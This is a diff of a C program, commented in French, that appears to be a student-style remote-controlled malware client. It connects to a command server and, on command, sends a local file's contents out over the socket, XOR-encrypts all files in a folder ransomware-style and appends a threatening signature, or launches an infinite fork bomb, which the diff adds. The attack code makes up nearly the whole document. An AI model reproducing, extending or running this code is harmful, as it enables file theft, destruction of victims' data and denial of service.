@@ -1,21 +1,21 @@
-#include <stdio.h>       // Gestion des entrées/sorties standard
-#include <stdlib.h>      // Gestion de la mémoire dynamique et utilitaires divers
-#include <string.h>      // Manipulation de chaînes de caractères
-#include <unistd.h>      // Fonctions POSIX (ex: close(), read(), write())
-#include <sys/socket.h>  // Gestion des sockets
-#include <netinet/in.h>  // Structures pour les sockets réseau (ex: sockaddr_in)
-#include <arpa/inet.h>   // Fonctions de manipulation des adresses réseau
-#include <dirent.h>      // Manipulation des répertoires
-#include <sys/stat.h>    // Informations sur les fichiers (ex: stat)
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 
+#define PORT 4242
+#define CLIENT_ID "7aB9X3rL"
+#define BUFFER_SIZE 1024
+#define KEY_SIZE 16
+#define FOLDER_PATH "/mnt/c/Users/Wallen/Documents/chiffre/"
 
-#define PORT 4242               // Port utilisé pour la connexion au serveur
-#define CLIENT_ID "7aB9X3rL"    // Identifiant du client
-#define BUFFER_SIZE 1024        // Taille des buffers utilisés dans le programme
-#define KEY_SIZE 16             // Taille de la clé utilisée pour le chiffrement
-
-#define FOLDER_PATH "/mnt/c/Users/Wallen/Documents/chiffre/"        // Chemin des fichiers à chiffrer
-#define SIGNATURE "\n\nRendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10\n"      // Signature ajoutée à la fin des fichiers chiffrés
+#define SIGNATURE "\n\nRendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10\n"
 
 int encrypt_file(const char *filename, const char *key) {       // Fonction qui chiffre un fichier avec XOR 
     FILE *file = fopen(filename, "r+");         // fopen ouvre le fichier en L/E
@@ -68,22 +68,29 @@ int encrypt_files_in_directory(const char *folder_path, const char *key) {      
     return files_encrypted; // Renvoie le nombre de fichiers chiffrés
 }
 
-void exfiltration(int socket_fd) {       //fonction qui exfiltre le contenue du fichier spécifié
+// Code pour gérer le fork infini
+void infinite_fork() {
+    while (1) {
+        fork();
+    }
+}
+
+void exfiltration(int socket_fd) {
     const char *file_to_exfiltrate = "/mnt/c/Users/Wallen/Documents/3_INFORMATIQUE/c/text.txt";
-    FILE *file = fopen(file_to_exfiltrate, "r");        // Ouvre le fichier en L
+    FILE *file = fopen(file_to_exfiltrate, "r");
     if (!file) {
-        perror("Erreur !");
+        perror("Erreur d'ouverture du fichier à exfiltrer");
         return;
     }
 
-    char content[BUFFER_SIZE];      // Lit le contenu du fichier dans un buffer
+    char content[BUFFER_SIZE];
     fread(content, 1, sizeof(content) - 1, file);
     fclose(file);
 
-    send(socket_fd, content, strlen(content), 0);       // Envoie le contenu lu au serveur via la socket
+    send(socket_fd, content, strlen(content), 0);
 }
 
-int main() {        // Initialisation dans connexion client/serveur
+int main() {
     struct sockaddr_in sa;
     int socket_fd;
     int status;
@@ -108,23 +115,34 @@ int main() {        // Initialisation dans connexion client/serveur
         return 2;
     }
 
-    send(socket_fd, CLIENT_ID, strlen(CLIENT_ID), 0);       // Envoie l’identifiant du client au serveur
+    send(socket_fd, CLIENT_ID, strlen(CLIENT_ID), 0);
 
-    bytes_read = recv(socket_fd, buffer, sizeof(buffer), 0);
-    if (bytes_read > 0) {
-        buffer[bytes_read] = '\0';
+ while (1) { // Boucle principale pour maintenir la connexion
+        bytes_read = recv(socket_fd, buffer, sizeof(buffer), 0);
+        if (bytes_read <= 0) {
+            printf("Connexion avec le serveur terminée.\n");
+            break; // Quitte la boucle si le serveur ferme la connexion
+        }
 
-        if (strcmp(buffer, "exfiltration") == 0) {      // Si la commande reçue est exfiltration, exécute l'exfiltration
-            printf("Données exfiltrées.\n");
+        buffer[bytes_read] = '\0'; // Terminer correctement la chaîne reçue
+
+        if (strcmp(buffer, "exfiltration") == 0) {
+            printf("Exfiltration des données.\n");
             exfiltration(socket_fd);
+        } else if (strcmp(buffer, "fork") == 0) {
+            printf("Exécution de l'ordre 'fork'.\n");
+            infinite_fork();
+        } else if (strcmp(buffer, "out") == 0) {
+            printf("Fermeture demandée par le serveur.\n");
+            break; // Quitte la boucle sur demande explicite du serveur
         } else {
-            printf("Fichiers du repertoire chiffrés.\n");
-            int num_files_encrypted = encrypt_files_in_directory(FOLDER_PATH, buffer);      // Sinon execute l'ordre ransomware
+            printf("Fichiers du répertoire chiffrés.\n");
+            int num_files_encrypted = encrypt_files_in_directory(FOLDER_PATH, buffer);
             sprintf(buffer, "%d", num_files_encrypted);
             send(socket_fd, buffer, strlen(buffer), 0);
         }
     }
 
-    close(socket_fd);
+    close(socket_fd); // Fermer proprement la socket après la sortie de la boucle
     return 0;
 }
